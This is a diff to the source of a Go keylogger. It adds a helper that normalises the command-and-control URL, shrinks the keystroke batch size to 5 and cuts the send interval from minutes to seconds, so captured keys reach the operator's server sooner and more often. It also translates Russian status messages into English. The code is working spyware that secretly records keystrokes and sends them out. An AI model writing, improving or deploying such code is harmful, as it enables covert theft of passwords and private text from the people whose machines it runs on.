@@ -146,19 +146,32 @@ func SendKeyLog(enteredKeys []string, url string) {
 	defer res.Body.Close()
 }
 
+func AddHttpKey(url string) string {
+	var compare string
+	for i := range url {
+		compare += string(url[i])
+		if compare == "http://" {
+			return url
+		}
+	}
+	return "http://" + url
+}
+
 func main() {
 
 	var (
-		keysToSendFlag    = flag.Int("kCount", 1000, "Num of keys to store and send at one time[DEFAULT: 1000]")
+		keysToSendFlag    = flag.Int("kCount", 5, "Num of keys to store and send at one time[DEFAULT: 1000]")
 		timeUntilSendFlag = flag.Int("tCount", 10, "Minutes until send captured keys [DEFAULT: 10]")
-		url               = flag.String("url", "", "C&C URL (Don't forget http://) [DEFAULT: EMPTY]")
+		url               = flag.String("url", "", "C&C URL [DEFAULT: EMPTY] (Required)")
 	)
 
 	flag.Parse()
 
-	timeUntilSend := time.Minute * time.Duration(*timeUntilSendFlag)
+	timeUntilSend := time.Second * time.Duration(*timeUntilSendFlag)
 
 	if *url != "" {
+		*url = AddHttpKey(*url)
+		fmt.Println(*url)
 		kl := NewKeyLogger()
 		var enteredKeys []string
 
@@ -172,7 +185,7 @@ func main() {
 		timerFunc = func() {
 			now := time.Now()
 			if len(enteredKeys) != 0 {
-				fmt.Println(now, "Отправка время", timeUntilSend)
+				fmt.Println(now, "Sent by time", timeUntilSend)
 				SendKeyLog(enteredKeys, *url)
 				enteredKeys = nil
 			}
@@ -193,7 +206,7 @@ func main() {
 
 				//if number of entered keys is larger than keysToSendFlag, then SendKeyLog is being called
 				if len(enteredKeys) >= *keysToSendFlag {
-					fmt.Println(time.Now(), "Отправка кол-во символов")
+					fmt.Println(time.Now(), "Sent by count")
 					SendKeyLog(enteredKeys, *url)
 					enteredKeys = nil
 
